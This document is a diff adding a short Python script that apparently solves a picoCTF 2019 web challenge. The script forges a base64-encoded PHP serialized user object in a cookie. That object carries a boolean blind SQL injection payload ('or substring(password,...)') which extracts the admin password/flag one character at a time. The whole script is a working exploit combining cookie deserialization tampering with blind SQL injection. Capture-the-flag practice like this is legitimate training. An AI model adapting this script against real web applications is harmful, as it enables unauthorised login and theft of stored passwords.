@@ -1,0 +1,31 @@
+#nhthongdfvn
+import requests
+import base64
+import string
+url='https://2019shell1.picoctf.com/problem/62195/index.php?file=admin'
+#charset="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!_{}"
+charset="abcdefghijklmnopqrstuvwxyz0123456789!_{}"
+i=0
+flag='picoctf{c'
+length=10
+lenstr=31
+while 1:
+    #print(charset[i])
+    if (length>=10):
+        lenstr=32
+    else:
+        lenstr=31
+    data= "O:8:\"siteuser\":2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:"+str(lenstr)+":\"' or substring(password,"+str(length)+",1)='"+charset[i]+"\";}"
+    info = base64.b64encode(data.encode("utf-8")).decode("utf-8")
+    headers = {'Cookie': "user_info=" + info}
+    r = requests.get(url,headers=headers)
+    #print (r.text)
+    if ('Welcome to the admin page!' in r.text):
+        flag=flag+charset[i]
+        i=-1
+        length+=1
+        print(flag)
+    i+=1
+    if '}' in flag:
+        break;
+
